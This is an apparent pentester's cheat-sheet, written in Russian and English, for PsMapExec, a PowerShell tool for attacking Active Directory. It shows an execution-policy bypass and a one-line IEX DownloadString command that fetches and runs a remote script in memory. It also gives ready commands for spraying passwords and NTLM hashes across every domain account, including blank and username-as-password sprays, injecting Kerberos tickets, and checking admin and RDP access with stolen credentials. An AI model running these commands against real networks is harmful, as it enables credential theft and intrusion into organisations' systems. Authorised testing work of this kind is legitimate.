Утилита широкого назначения для Windows из под PowerShell

https://github.com/The-Viper-One/PsMapExec
[Сайт утилиты (гайды)](https://viperone.gitbook.io/pentest-everything/psmapexec)

```cmd
powershell.exe -exec bypass
```

**Установка в 1 команду**
```PowerShell
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
```

**Может много всего, полный список на гитхабе, кратко:**
* [[AD Password Spraying]]
* Checking access with specified credentials / hashes / tickets
* Check [[RDP]] access

## Inject ticket

Если тулза запускается из под системы, которая не в домене, то надо инжектнуть билет в память
```PowerShell
PsMapExec -Method Inject -Username [User] -Password [Password]
```
## Useful Tips

```PowerShell
-SuccessOnly # Выводить только успешные результаты, например для спрея
-Domain # Явно указывает домен
```

## Check valid access

When -Command and -Module are omitted, PsMapExec will simply check the provided or current user credentials against the specified target systems for administrative access over the specified method.

```PowerShell
# Current user
PsMapExec -Targets All -Method [Method]

# With Password
PsMapExec -Targets All -Method [Method] -Username [Username] -Password [Password]

# With Hash
PsMapExec -Targets All -Method [Method] -Username [Username] -Hash [RC4/AES256/NTLM]

# With Ticket
PsMapExec -Targets All -Method [Method] -Ticket [doI.. OR Path to ticket file]

# Local Authentication (WMI only)
PsMapExec -Targets All -Method WMI -LocalAuth
```

## Check RDP

Проверяет [[RDP]] доступ к компам по заданным credentials

```PowerShell
PsMapExec -Targets Workstations -Method RDP -Username USER -Password 'Pa$$w0rd' -Domain DOMAIN
```
## Target 

By default only enabled Active Directory computer accounts are populated into the target list.
```PowerShell
# All workstations, servers and domain controllers within the domain
PsMapExec -Targets All

# All workstations, servers and domain controllers on the specified domain
PsMapExec -Targets All -Domain [Domain]

# Only servers from the domain (exluding DCs)
PsMapExec -Targets Servers

# Only Domain Controllers from the domain
PsMapExec -Targets DCs

# Only workstations from the domain
PsMapExec -Targets Workstations

# Set the target values to a defined computer name
PsMapExec -Targets DC01.Security.local

# Read targets from file
PsMapExec -Targets "C:\Targets.txt"

# Wildcard filtering
PsMapExec -Targets SRV*

# Single IP Address
PsMapExec -Targets 192.168.56.11

# CIDR Range
PsMapExec -Targets 192.168.56.0/24
```

## Spraying

```PowerShell
# Spray passwords across all accounts in the domain
PsMapExec -Method Spray 

# + one of this

-SprayPassword [Password]
-SprayHash [Hash]
-EmptyPassword # Sprays blank passwords   
-AccountAsPassword # SAM acc names as pwd
-SuccessOnly # only [+]
```

